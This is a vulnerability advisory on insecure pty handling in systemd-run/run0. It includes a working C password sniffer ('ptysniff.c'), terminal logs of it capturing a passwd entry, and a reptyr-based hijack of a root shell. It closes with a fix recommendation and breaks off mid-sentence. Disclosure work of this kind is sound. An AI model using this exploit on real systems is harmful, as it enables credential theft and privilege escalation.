---
title: Systemd Insecure PTY Handling
url: https://cxsecurity.com/issue/WLB-2024050020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-07
fetch_date: 2025-10-06T17:15:44.503384
---

# Systemd Insecure PTY Handling

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Systemd Insecure PTY Handling** **2024.05.06**  Credit:  **[Adam Gowdiak](https://cxsecurity.com/author/Adam%2BGowdiak/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Systemd Insecure PTY Handling Vulnerability
===========================================
CVSSv3.BaseScore: 5.8
CVSSv3.Vector: AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:N
Short Description
=================
Systemd-run/run0 allocates user-owned pty's and attaches the slave
to high privilege programs without changing ownership or locking
the pty slave.
Description
===========
Systemd-run/run0 is working towards a "sudo"-like replacement for
v256 that is based on the existing policykit and d-bus based "systemd-run"
transient service execution. The code in "src/run/run.c" on line 1673
creates a PTY master and slave used for this process, and the slave
name is passed to unlockpt() on line 1689. This allows any process to
connect to e.g. "/dev/pts/4" slave interface, this interface is created
under the local user context executing "systemd-run". The code subsequently
uses a PTY forwarder (src/shared/ptyfwd.c) and d-bus once authentication
by policykit is approved, the slave end of the pty created will be
attached to the privileged executed program. As the slave interface
is not locked to the privilege level of the newly executed process,
a vulnerability is introduced to the system as any same-user process
can now interact with the slave end of the root program.
Exploitation
============
This issue can be exploited by opening a handle to the slave interface
and using terminal I/O routines such as read() to access the input of
the root program. Slave PTY's are not designed for multiple programs to
access them and this has the unintended effect of redirecting input
intended for the privileged program back to unprivileged processes, an
example code "ptysniff.c" is provided here and terminal output that shows
the issue being used to read input from a systemd-run executed "passwd"
program, returning the password intended for the root program back to the
local user.
User Terminal
=============
The user executes systemd with "--pty" to allocate a new "root" pty and
execute "passwd" in the new terminal.
fantastic@fantastic-pc /dev/pts  systemd-run --pty passwd
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to manage system services or other units.
Authenticating as: fantastic
Password:
==== AUTHENTICATION COMPLETE ====
Running as unit: run-u63.service
Press ^] three times within 1s to disconnect TTY.
New password:
Retype new password:
Attacker Terminal
=================
The slave end of the systemd-run terminal is still owned by the local user
context, "/dev/pts/5" in the example above - allowing ptysniff to read the
password input intended to be sent to "passwd".
fantastic@fantastic-pc  /Work/voldermort  ls -al /dev/pts/5
Permissions Size User Date Modified Name
crw--w---- 136,5 fantastic 4 May 08:51  /dev/pts/5
fantastic@fantastic-pc  /Work/voldermort  ./ptysniff /dev/pts/5
Received: p
Received: a
Received: s
Received: s
Received: w
Received: o
Received: r
Received: d
Received:
/\* ptysniff.c - read from a slave pts used by a higher privileged program \*/
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#define BUF\_SIZE 1024
int main(int argc, char \*argv[]) {
if (argc != 2) {
fprintf(stderr, "Usage: %s <pts>\n", argv[0]);
return 1;
}
int fd = open(argv[1], O\_RDWR | O\_NOCTTY);
if (fd == -1) {
perror("open");
return 1;
}
char buf[BUF\_SIZE];
ssize\_t numRead;
while (1) {
if (flock(fd, LOCK\_EX) == -1) {
perror("flock");
return 1;
}
numRead = read(fd, buf, BUF\_SIZE - 1);
if (numRead == -1) {
perror("read");
return 1;
}
for (int i = 0; i < numRead; i++) {
printf("Received: %c\n", buf[i]);
}
if (flock(fd, LOCK\_UN) == -1) {
perror("flock");
return 1;
}
}
return 0;
}
Recommendation
==============
It is recommended the systemd-run created pty slave interface
is chown()'d to the same user as the privileged execution context
that it operates, this would result in "permission denied" when
attempting to attach another program to the slave end of the pty.
Additional Information
======================
In addition to the vulnerability outlined above, it is possible to
exploit the problem to execute commands or completely hijack the
root owned program from the same-user context when other conditions
are met. Linux Kernel since around 4.1 has enabled ptrace YAMA, a
protection that limits the use of ptrace for debugging purposes.
With ptrace\_classic set to enabled, such as with the following
command.
"echo 0 | sudo tee /proc/sys/kernel/yama/ptrace\_scope"
It is possible to simply read the master fd for the pty from the
"systemd-run" application, and re-parent a process to use the
master end - hijacking the root program which would not be accessible
to ptrace. This can be done with GDB (set inferior tty) or a tool such
as "reptyr".
User Terminal
=============
fantastic@fantastic-pc  /Work/systemd   main   systemd-run --shell
Running as unit: run-u87.service; invocation ID: abc22b3152ae48cea20ce86c11b555a1
Press ^] three times within 1s to disconnect TTY.
[root@fantastic-pc systemd]#
Attacker Terminal
=================
fantastic@fantastic-pc  /Work/systemd   main   ps -aef | grep systemd-run | grep shell | grep -v grep;id;tty
fantast+ 5541 5477 0 09:08 pts/6 00:00:00 systemd-run --shell
uid=1000(fantastic) gid=1000(fantastic) groups=1000(fantastic),90(network),96(scanner),98(power),985(video),986(uucp),987(storage),990(optical),991(lp),994(input),998(wheel)
/dev/pts/1
fantastic@fantastic-pc  /Work/systemd   main   reptyr -T 5541
[root@fantastic-pc systemd]# id
uid=0(root) gid=0(root) groups=0(root)
[root@fantastic-pc systemd]# tty
/dev/pts/0
Enabling ptrace\_classic should not result in "root" permissions to unprivileged
users, many operating systems support debugging applications and can do so without
immediately giving away Administrative rights, YAMA is intended to provide this
protection. However, ses...